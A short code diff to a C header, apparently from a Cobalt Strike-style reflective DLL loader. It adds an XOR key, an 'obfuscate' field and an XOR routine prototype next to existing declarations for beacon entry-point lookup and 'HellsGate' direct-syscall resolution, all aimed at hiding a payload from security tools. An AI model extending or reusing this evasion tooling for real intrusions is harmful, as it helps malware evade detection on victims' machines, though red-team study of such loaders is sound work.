@@ -1,6 +1,7 @@
 #define WIN32_LEAN_AND_MEAN
 #include <windows.h>
 #define STATUS_SUCCESS 0x0
+#define XORKEY 0xC3
 
 typedef struct Export {
     void *   Directory;
@@ -24,6 +25,7 @@ typedef struct Dll {
     void* TextSection;
     unsigned int TextSectionSize;
     Export Export;
+    unsigned __int64 obfuscate;
 }Dll, *PDll;
 
 typedef struct Section {
@@ -298,6 +300,7 @@ unsigned int getNumberOfSections(void * newExeHeaderAddr);
 void *   getBeaconEntryPoint(void * newRdllAddr, void * OptionalHeaderAddr);
 void *   getRip(void);
 unsigned int copyWithDelimiter(void * dst, void * src, unsigned int n, CHAR delimiter);
+void xorc(unsigned __int64 length, unsigned char * buff, unsigned char maskkey);
 
 unsigned long findSyscallNumber(void * ntdllApiAddr);
 unsigned long HellsGate(unsigned long wSystemCall);
